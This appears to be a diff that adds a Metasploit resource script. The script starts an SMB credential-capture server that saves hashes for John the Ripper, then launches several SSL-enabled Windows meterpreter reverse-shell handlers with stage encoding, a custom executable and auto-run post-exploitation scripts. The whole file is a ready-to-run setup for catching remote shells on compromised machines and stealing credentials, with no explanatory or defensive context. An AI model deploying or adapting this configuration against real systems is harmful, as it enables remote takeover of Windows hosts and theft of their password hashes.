@@ -1,0 +1,42 @@
+
+set consolelogging true
+
+set loglevel 5
+set sessionlogging true
+set timestampoutput true
+set prompt %T S:%S J:%J
+setg VERBOSE true
+use auxiliary/server/capture/smb
+set JOHNPWFILE john.txt
+run
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+setg LHOST 0.0.0.0
+set SSL true
+set LPORT 5667
+setg AutoLoadStdapi true
+setg AutoSystemInfo true
+setg ExitOnSession false
+setg EnableStageEncoding true
+exploit -j -z
+
+set payload windows/x64/meterpreter/reverse_tcp
+set lport 5666
+setg lhost 0.0.0.0
+set payload windows/meterpreter/reverse_winhttps
+set LPORT 443
+set HandlerSSLCert /opt/CERT.pem
+set IgnoreUnknownPayloads true
+set AutoRunScript 'post/multi/gather/run_console_rc_file RESOURCE=/opt/autorun.rc'
+set StagerVerifySSLCert true
+exploit -j -z
+setg Exe::CUSTOM /opt/ConsoleApp4.exe
+set payload windows/meterpreter/reverse_tcp
+set LPORT 5666
+set HandlerSSLCert /opt/CERT.pem
+set IgnoreUnknownPayloads true
+set StagerVerifySSLCert true
+set AutoRunScript 'post/multi/gather/run_console_rc_file RESOURCE=/opt/autorun1.rc'
+exploit -j -z
+
